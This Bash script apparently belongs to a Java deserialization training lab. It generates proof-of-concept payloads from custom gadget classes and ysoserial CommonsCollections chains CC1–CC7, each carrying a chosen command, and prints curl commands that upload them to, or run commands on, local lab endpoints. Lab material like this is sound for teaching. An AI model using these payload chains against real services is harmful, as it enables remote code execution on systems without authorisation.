#!/bin/bash
# ============================================================
# 一键生成所有模块的 POC payload
# 用法: cd poc && bash gen_all.sh [command]
# 默认命令: id
# ============================================================
set -euo pipefail
CMD="${1:-id}"
GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  生成所有模块 POC Payload${NC}"
echo -e "${GREEN}  命令: ${CMD}${NC}"
echo -e "${GREEN}=============================================${NC}"

# class02-13: 自定义 Java payload
echo -e "\n${YELLOW}[class02] 基础反序列化...${NC}"
bash class02-unser/gen.sh

echo -e "\n${YELLOW}[class03] getName→命令执行...${NC}"
bash class03-unser-cmd/gen.sh

echo -e "\n${YELLOW}[class04] readObject→命令执行...${NC}"
bash class04-unser-readobj/gen.sh

echo -e "\n${YELLOW}[class07] InvokerTransformer...${NC}"
bash class07-invoker/gen.sh

echo -e "\n${YELLOW}[class08] ConstantTransformer...${NC}"
bash class08-constant/gen.sh

echo -e "\n${YELLOW}[class09] ChainedTransformer...${NC}"
bash class09-chained/gen.sh

echo -e "\n${YELLOW}[class10] LazyMap...${NC}"
bash class10-lazymap/gen.sh

echo -e "\n${YELLOW}[class11] InstantiateTransformer...${NC}"
bash class11-instantiate/gen.sh

echo -e "\n${YELLOW}[class12] TemplatesImpl...${NC}"
bash class12-templates/gen.sh

echo -e "\n${YELLOW}[class13] TransformedMap...${NC}"
bash class13-transformedmap/gen.sh

# class14-20: ysoserial chains
echo -e "\n${YELLOW}[class14] CC1 链...${NC}"
bash ysoserial/class14-cc1/gen.sh "$CMD"

echo -e "\n${YELLOW}[class15] CC2 链...${NC}"
bash ysoserial/class15-cc2/gen.sh "$CMD"

echo -e "\n${YELLOW}[class16] CC3 链...${NC}"
bash ysoserial/class16-cc3/gen.sh "$CMD"

echo -e "\n${YELLOW}[class17] CC4 链...${NC}"
bash ysoserial/class17-cc4/gen.sh "$CMD"

echo -e "\n${YELLOW}[class18] CC5 链...${NC}"
bash ysoserial/class18-cc5/gen.sh "$CMD"

echo -e "\n${YELLOW}[class19] CC6 链...${NC}"
bash ysoserial/class19-cc6/gen.sh "$CMD"

echo -e "\n${YELLOW}[class20] CC7 链...${NC}"
bash ysoserial/class20-cc7/gen.sh "$CMD"

echo -e "\n${GREEN}=============================================${NC}"
echo -e "${GREEN}  ✅ 全部生成完成！${NC}"
echo -e "${GREEN}  共 18 个 payload 文件${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo "上传方法:"
echo "  curl -X POST -F \"uploadFile=@class02.ser\" http://localhost:81/class02/upload"
echo ""
echo "class01 不需要 payload 文件，直接 POST:"
echo "  curl -X POST http://localhost:81/class01/execute -d \"command=id\""
